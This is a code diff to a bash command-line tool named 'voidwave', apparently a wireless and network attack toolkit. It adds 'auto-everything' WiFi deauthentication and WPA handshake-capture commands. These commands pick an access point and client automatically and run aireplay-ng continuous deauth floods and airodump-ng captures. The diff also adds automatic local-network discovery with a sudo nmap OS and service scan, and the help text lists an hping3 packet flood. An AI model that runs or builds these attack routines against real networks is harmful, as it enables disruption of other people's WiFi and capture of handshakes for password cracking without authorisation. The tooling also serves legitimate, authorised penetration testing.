@@ -95,7 +95,7 @@ source "$VOIDWAVE_ROOT/lib/version.sh"
 
 # Source core libraries in dependency order
 # Each lib has a guard to prevent multiple sourcing
-for lib in core ui safety detection config utils wireless wizards sessions memory; do
+for lib in core ui safety detection config utils wireless wizards sessions memory automation; do
     # shellcheck source=/dev/null
     source "$VOIDWAVE_ROOT/lib/${lib}.sh" || {
         echo "ERROR: Failed to source lib/${lib}.sh" >&2
@@ -341,9 +341,12 @@ CONFIG SUBCOMMANDS:
 
 WIFI SUBCOMMANDS:
     wifi list                List wireless interfaces
-    wifi status <iface>      Show interface mode
-    wifi monitor on <iface>  Enable monitor mode
-    wifi monitor off <iface> Disable monitor mode
+    wifi status [iface]      Show interface mode (auto-selects)
+    wifi monitor on [iface]  Enable monitor mode (auto-selects)
+    wifi monitor off [iface] Disable monitor mode (auto-selects)
+    wifi scan [iface]        Scan for APs (auto-monitor)
+    wifi deauth [iface]      Deauth attack (auto-everything)
+    wifi capture [iface]     Capture handshakes (auto-everything)
 
 STRESS SUBCOMMANDS:
     stress hping <target>    Run hping3 packet flood
@@ -551,18 +554,23 @@ main() {
             exit 0
             ;;
         scan)
-            # Use TARGET from --target flag, or first positional argument
+            # Use TARGET from --target flag, or first positional argument, or auto-discover
             local scan_target="${TARGET:-${1:-}}"
-            if declare -f run_nmap_quick &>/dev/null && [[ -n "$scan_target" ]]; then
+            if [[ -z "$scan_target" ]]; then
+                log_info "No target specified, discovering network..."
+                scan_target=$(auto_get_local_network) || {
+                    log_error "Could not detect local network"
+                    exit 1
+                }
+            fi
+            if declare -f run_nmap_quick &>/dev/null; then
                 print_if_verbose "Scanning target: $scan_target"
+                auto_install_tool nmap || { log_error "nmap required"; exit 1; }
                 run_nmap_quick "$scan_target"
-            elif [[ -z "$scan_target" ]]; then
-                log_error "Missing target. Use --target or provide as argument."
-                echo "Usage: voidwave scan <target>"
-                echo "       voidwave --target <IP> scan"
-                exit 1
             else
-                log_info "Scan command placeholder - modules not yet migrated"
+                auto_install_tool nmap || { log_error "nmap required"; exit 1; }
+                log_info "Running nmap scan on $scan_target..."
+                run_with_sudo nmap -sV -sC -O "$scan_target"
             fi
             exit 0
             ;;
@@ -574,40 +582,99 @@ main() {
                     exit $?
                     ;;
                 status)
-                    # Show interface monitor mode status
-                    if [[ -z "${2:-}" ]]; then
-                        log_error "Missing interface argument"
-                        echo "Usage: voidwave wifi status <interface>"
-                        exit 1
+                    # Show interface monitor mode status (auto-select if not specified)
+                    local status_iface="${2:-}"
+                    if [[ -z "$status_iface" ]]; then
+                        status_iface=$(auto_select_interface) || {
+                            log_error "No wireless interface found"
+                            exit 1
+                        }
                     fi
-                    check_monitor_mode "$2"
+                    check_monitor_mode "$status_iface"
                     exit $?
                     ;;
                 monitor)
                     case "${2:-}" in
                         on)
-                            if [[ -z "${3:-}" ]]; then
-                                log_error "Missing interface argument"
-                                echo "Usage: voidwave wifi monitor on <interface>"
-                                exit 1
+                            # Auto-select interface if not specified
+                            local mon_iface="${3:-}"
+                            if [[ -z "$mon_iface" ]]; then
+                                mon_iface=$(auto_select_interface) || {
+                                    log_error "No wireless interface found"
+                                    exit 1
+                                }
                             fi
-                            enable_monitor_mode "$3"
+                            enable_monitor_mode "$mon_iface"
                             exit $?
                             ;;
                         off)
-                            if [[ -z "${3:-}" ]]; then
-                                log_error "Missing interface argument"
-                                echo "Usage: voidwave wifi monitor off <interface>"
-                                exit 1
+                            # Auto-select monitor interface if not specified
+                            local off_iface="${3:-}"
+                            if [[ -z "$off_iface" ]]; then
+                                off_iface=$(auto_select_interface) || {
+                                    log_error "No wireless interface found"
+                                    exit 1
+                                }
                             fi
-                            disable_monitor_mode "$3"
+                            disable_monitor_mode "$off_iface"
                             exit $?
                             ;;
                         *)
-                            echo "Usage: voidwave wifi monitor <on|off> <interface>"
+                            echo "Usage: voidwave wifi monitor <on|off> [interface]"
                             exit 1
                             ;;
                     esac
+                    ;;
+                scan)
+                    # Scan for APs - auto-selects interface, auto-enables monitor
+                    log_info "Starting WiFi scan..."
+                    auto_install_tool airodump-ng aircrack-ng || {
+                        log_error "aircrack-ng suite required"
+                        exit 1
+                    }
+                    local scan_iface
+                    scan_iface=$(auto_ensure_monitor "${2:-}") || exit 1
+                    auto_scan_aps "$scan_iface"
+                    exit $?
+                    ;;
+                deauth)
+                    # Deauth attack - full auto: interface, monitor, AP, client
+                    log_info "Preparing deauth attack..."
+                    auto_install_tool aireplay-ng aircrack-ng || {
+                        log_error "aircrack-ng suite required"
+                        exit 1
+                    }
+                    auto_select_ap_and_client "${2:-}" || exit 1
+                    local deauth_iface
+                    deauth_iface=$(auto_ensure_monitor "${2:-}") || exit 1
+
+                    # Set channel
+                    run_with_sudo iw dev "$deauth_iface" set channel "$AP_CHANNEL" 2>/dev/null || true
+
+                    log_warning "Sending deauth to $CLIENT_MAC on $AP_BSSID (CH:$AP_CHANNEL)"
+                    local deauth_count="${3:-0}"  # 0 = continuous
+                    run_with_sudo aireplay-ng --deauth "$deauth_count" -a "$AP_BSSID" -c "$CLIENT_MAC" "$deauth_iface"
+                    exit $?
+                    ;;
+                capture)
+                    # Capture handshakes - auto interface, monitor, AP selection
+                    log_info "Preparing handshake capture..."
+                    auto_install_tool airodump-ng aircrack-ng || {
+                        log_error "aircrack-ng suite required"
+                        exit 1
+                    }
+                    auto_select_ap_and_client "${2:-}" || exit 1
+                    local cap_iface
+                    cap_iface=$(auto_ensure_monitor "${2:-}") || exit 1
+
+                    # Set channel
+                    run_with_sudo iw dev "$cap_iface" set channel "$AP_CHANNEL" 2>/dev/null || true
+
+                    local cap_file="${VOIDWAVE_OUTPUT_DIR:-$VOIDWAVE_ROOT/output}/capture_$(date +%Y%m%d_%H%M%S)"
+                    log_info "Capturing to $cap_file..."
+                    log_info "Press Ctrl+C when handshake captured"
+                    run_with_sudo airodump-ng --bssid "$AP_BSSID" --channel "$AP_CHANNEL" -w "$cap_file" "$cap_iface"
+                    exit $?
                     ;;
                 "")
                     # No subcommand - show wifi usage
@@ -618,21 +685,26 @@ Usage: voidwave wifi <command> [options]
 
 Commands:
   list                    List wireless interfaces
-  status <iface>          Show interface mode (monitor/managed)
-  monitor on <iface>      Enable monitor mode
-  monitor off <iface>     Disable monitor mode
+  status [iface]          Show interface mode (auto-selects if omitted)
+  monitor on [iface]      Enable monitor mode (auto-selects if omitted)
+  monitor off [iface]     Disable monitor mode (auto-selects if omitted)
+  scan [iface]            Scan for APs (auto-monitor, auto-interface)
+  deauth [iface] [count]  Deauth attack (auto-everything)
+  capture [iface]         Capture handshakes (auto-everything)
 
 Examples:
   voidwave wifi list
-  voidwave wifi status wlan0
-  voidwave wifi monitor on wlan0
-  voidwave wifi monitor off wlan0mon
+  voidwave wifi status              # auto-selects interface
+  voidwave wifi monitor on          # auto-selects interface
+  voidwave wifi scan                # auto-interface, auto-monitor
+  voidwave wifi deauth              # auto: interface, monitor, AP, client
+  voidwave wifi capture             # auto: interface, monitor, AP selection
 WIFI_HELP
                     exit 0
                     ;;
                 *)
                     log_error "Unknown wifi subcommand: ${1:-}"
-                    echo "Usage: voidwave wifi [list|status|monitor]"
+                    echo "Usage: voidwave wifi [list|status|monitor|scan|deauth|capture]"
                     exit 1
                     ;;
             esac
